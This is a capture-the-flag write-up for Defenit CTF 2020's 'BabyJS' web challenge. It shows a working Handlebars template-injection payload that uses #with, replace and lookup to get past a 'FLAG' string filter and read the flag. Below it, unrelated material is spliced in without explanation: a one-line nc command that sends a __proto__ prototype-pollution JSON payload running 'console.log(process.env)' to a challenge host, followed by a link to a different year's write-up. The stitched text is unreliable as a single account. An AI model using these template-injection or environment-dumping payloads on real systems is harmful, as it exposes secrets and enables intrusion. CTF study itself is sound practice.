# BabyJS  
*Defenit CTF 2020 - Web 248*  
  
*Writeup by Payload as ToEatSushi*

## Problem

Render me If you can.

## Look up

```javascript

/* ... */  
if (typeof content === 'string' && content.indexOf('FLAG') != -1 || typeof
content === 'string' && content.length > 200) {  
   res.end('Request blocked');  
   return;  
}  
/* ... */

app.get('/', (req, res) => {  
   const { p } = req.query;  
   if (!p) res.redirect('/?p=index');  
   else res.render(p, { FLAG, 'apple': 'mint' });  
});

app.post('/', (req, res) => {  
   const { body: { content }, userDir, saveDir } = req;  
   const filename = crypto.randomBytes(8).toString('hex');

   let p = path.join('temp', userDir, filename)  
  
   fs.writeFile(`${path.join(saveDir, filename)}.html`, content, () => {  
       res.redirect(`/?p=${p}`);  
   })  
});

```

Okay, we can render our own template which has <=200 bytes, and don't contians
string `FLAG`. Template engine is handlebars.

## Handlebars 101

Handlebars save there own templating environ in object `this`. In fact, when
we try `{{ log this }}`, then node.js console shows the structure of `this`
and it includes `FLAG` and `apple`.

And, there is a one more important feature `lookup`. It returns a value of
object with key. In here, key can be either string or identifier. Like, when
`a='FLAG'` then, `{{lookup this a}}` will give a flag.

Finally, `#with` statement allows us to do a lot of things. Actually, it's
really like javascript's `with`, which moves scope into the given object.

## Exploit

```  
{{#with this as |k|}}  
 {{#with "FLag"}}  
   {{#with (replace "ag" "AG") as |payload|}}  
     {{lookup k payload}}  
   {{/with}}  
 {{/with}}  
{{/with}

```

Simple explantation:  
1. Save top `this` as k to prevent this is overwritten in other with block  
2. with "FLag", move scope into `String "FLag"`  
3. Call member function `replace` under "FLag", to make "FLAG". Save it to payload  
4. Lookup saved k and get flag.

Anyway, the flag is not related with this challenge. Actually, it'll be a
great hint of AdultJS.

**`Defenit{w3bd4v_0v3r_h7tp_n71m_0v3r_Sm8}`**  

Original writeup (https://github.com/mdsnins/ctf-
writeups/blob/master/2020/Defenit%20CTF/BabyJS/babyjs.md).```  
echo '{"a":1e-9123,"b":-1e-9234324,"c":"NaN","d":"NaN","e":-1,"f":"0","g":null,"h":99999999e999999999999,"i":3,"__proto__":"","y":"constructor","z":"console.log(process.env)"}' | nc flu.xxx 2071  
```https://eugenekolo.com/blog/nullcon-hackim-ctf-2019/#babyjs26solves

Original writeup (https://eugenekolo.com/blog/nullcon-hackim-
ctf-2019/#babyjs26solves).